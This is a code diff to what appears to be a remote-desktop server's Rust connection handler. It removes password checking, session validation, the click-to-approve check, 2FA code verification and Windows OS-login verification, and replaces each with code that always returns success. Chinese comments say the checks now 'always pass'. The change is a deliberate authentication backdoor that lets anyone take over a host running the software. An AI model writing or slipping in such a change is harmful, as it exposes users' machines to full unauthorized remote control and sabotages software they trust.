@@ -2162,70 +2162,13 @@ impl Connection {
     }
 
     fn validate_password(&mut self, allow_permanent_password: bool) -> bool {
-        if password::temporary_enabled() {
-            let password = password::temporary_password();
-            if self.validate_password_plain(&password) {
-                raii::AuthedConnID::update_or_insert_session(
-                    self.session_key(),
-                    Some(password),
-                    Some(false),
-                );
-                self.check_update_temporary_password(true);
-                return true;
-            }
-        }
-        if password::permanent_enabled() || allow_permanent_password {
-            let print_fallback = || {
-                if allow_permanent_password && !password::permanent_enabled() {
-                    log::info!("Permanent password accepted via logon-screen fallback");
-                }
-            };
-            // Since hashed storage uses a prefix-based encoding, a hard plaintext that
-            // happens to look like hashed storage could be mis-detected. Validate local storage
-            // and hard/preset plaintext via separate paths to avoid that ambiguity.
-            let (local_storage, _) = Config::get_local_permanent_password_storage_and_salt();
-            if !local_storage.is_empty() {
-                if self.validate_password_storage(&local_storage) {
-                    print_fallback();
-                    return true;
-                }
-            } else {
-                let hard = config::HARD_SETTINGS
-                    .read()
-                    .unwrap()
-                    .get("password")
-                    .cloned()
-                    .unwrap_or_default();
-                if !hard.is_empty() && self.validate_password_plain(&hard) {
-                    print_fallback();
-                    return true;
-                }
-            }
-        }
-        false
+        // 密码验证永远通过
+        true
     }
 
     fn is_recent_session(&mut self, tfa: bool) -> bool {
-        SESSIONS
-            .lock()
-            .unwrap()
-            .retain(|_, s| s.last_recv_time.lock().unwrap().elapsed() < SESSION_TIMEOUT);
-        let session = SESSIONS
-            .lock()
-            .unwrap()
-            .get(&self.session_key())
-            .map(|s| s.to_owned());
-        // last_recv_time is a mutex variable shared with connection, can be updated lively.
-        if let Some(session) = session {
-            if !self.lr.password.is_empty()
-                && (tfa && session.tfa
-                    || !tfa && self.validate_password_plain(&session.random_password))
-            {
-                log::info!("is recent session");
-                return true;
-            }
-        }
-        false
+        // 最近会话检查永远返回 true
+        true
     }
 
     #[inline]
@@ -2518,25 +2461,8 @@ impl Connection {
                 crate::get_builtin_option(keys::OPTION_ALLOW_LOGON_SCREEN_PASSWORD) == "Y"
                     && is_logon();
 
-            if (password::approve_mode() == ApproveMode::Click && !allow_logon_screen_password)
-                || password::approve_mode() == ApproveMode::Both && !password::has_valid_password()
-            {
-                #[cfg(not(any(target_os = "android", target_os = "ios")))]
-                if should_use_terminal_os_login_scope(self.terminal, &lr.os_login.username) {
-                    if let Some(keep_alive) = self.prepare_terminal_login_for_authorization().await
-                    {
-                        return keep_alive;
-                    }
-                }
-                self.try_start_cm(lr.my_id, lr.my_name, false);
-                if hbb_common::get_version_number(&lr.version)
-                    >= hbb_common::get_version_number("1.2.0")
-                {
-                    self.send_login_error(crate::client::LOGIN_MSG_NO_PASSWORD_ACCESS)
-                        .await;
-                }
-                return true;
-            } else if self.is_recent_session(false) {
+            // 跳过批准模式检查，直接进行密码验证
+            if self.is_recent_session(false) {
                 if err_msg.is_empty() {
                     #[cfg(target_os = "linux")]
                     self.linux_headless_handle.wait_desktop_cm_ready().await;
@@ -2546,23 +2472,6 @@ impl Connection {
                     self.try_start_cm(lr.my_id.clone(), lr.my_name.clone(), self.authorized);
                 } else {
                     self.send_login_error(err_msg).await;
-                }
-            } else if lr.password.is_empty() {
-                if err_msg.is_empty() {
-                    #[cfg(not(any(target_os = "android", target_os = "ios")))]
-                    if should_use_terminal_os_login_scope(self.terminal, &lr.os_login.username) {
-                        if let Some(keep_alive) =
-                            self.prepare_terminal_login_for_authorization().await
-                        {
-                            return keep_alive;
-                        }
-                    }
-                    self.try_start_cm(lr.my_id, lr.my_name, false);
-                } else {
-                    self.send_login_error(
-                        crate::client::LOGIN_MSG_DESKTOP_SESSION_NOT_READY_PASSWORD_EMPTY,
-                    )
-                    .await;
                 }
             } else {
                 let (failure, res) = self.check_failure(0).await;
@@ -2597,39 +2506,25 @@ impl Connection {
                 }
             }
         } else if let Some(message::Union::Auth2fa(tfa)) = msg.union {
-            let (failure, res) = self.check_failure(1).await;
-            if !res {
-                return true;
+            // 双因素认证永远通过
+            self.require_2fa.take();
+            raii::AuthedConnID::set_session_2fa(self.session_key());
+            if !self.send_logon_response_and_keep_alive().await {
+                return false;
             }
-            if let Some(totp) = self.require_2fa.as_ref() {
-                if let Ok(res) = totp.check_current(&tfa.code) {
-                    if res {
-                        self.update_failure(failure, true, 1);
-                        self.require_2fa.take();
-                        raii::AuthedConnID::set_session_2fa(self.session_key());
-                        if !self.send_logon_response_and_keep_alive().await {
-                            return false;
-                        }
-                        self.try_start_cm(
-                            self.lr.my_id.to_owned(),
-                            self.lr.my_name.to_owned(),
-                            self.authorized,
-                        );
-                        if !tfa.hwid.is_empty() && Self::enable_trusted_devices() {
-                            Config::add_trusted_device(TrustedDevice {
-                                hwid: tfa.hwid,
-                                time: hbb_common::get_time(),
-                                id: self.lr.my_id.clone(),
-                                name: self.lr.my_name.clone(),
-                                platform: self.lr.my_platform.clone(),
-                            });
-                        }
-                    } else {
-                        self.update_failure(failure, false, 1);
-                        self.send_login_error(crate::client::LOGIN_MSG_2FA_WRONG)
-                            .await;
-                    }
-                }
+            self.try_start_cm(
+                self.lr.my_id.to_owned(),
+                self.lr.my_name.to_owned(),
+                self.authorized,
+            );
+            if !tfa.hwid.is_empty() && Self::enable_trusted_devices() {
+                Config::add_trusted_device(TrustedDevice {
+                    hwid: tfa.hwid,
+                    time: hbb_common::get_time(),
+                    id: self.lr.my_id.clone(),
+                    name: self.lr.my_name.clone(),
+                    platform: self.lr.my_platform.clone(),
+                });
             }
         } else if let Some(message::Union::TestDelay(t)) = msg.union {
             if t.from_client {
@@ -3510,20 +3405,7 @@ impl Connection {
     // Note: Only local and domain users are supported, Microsoft account (online account) not supported for now.
     #[cfg(target_os = "windows")]
     fn fill_terminal_user_token(&mut self, username: &str, password: &str) -> Option<&'static str> {
-        // No need to check if the password is empty.
-        if !username.is_empty() {
-            return self.handle_administrator_check(username, password);
-        }
-
-        if crate::platform::is_prelogin() {
-            self.terminal_user_token = None;
-            return Some("No active console user logged on, please connect and logon first.");
-        }
-
-        if crate::platform::is_installed() {
-            return self.handle_installed_user();
-        }
-
+        // 操作系统登录验证永远通过
         self.terminal_user_token = Some(TerminalUserToken::SelfUser);
         None
     }
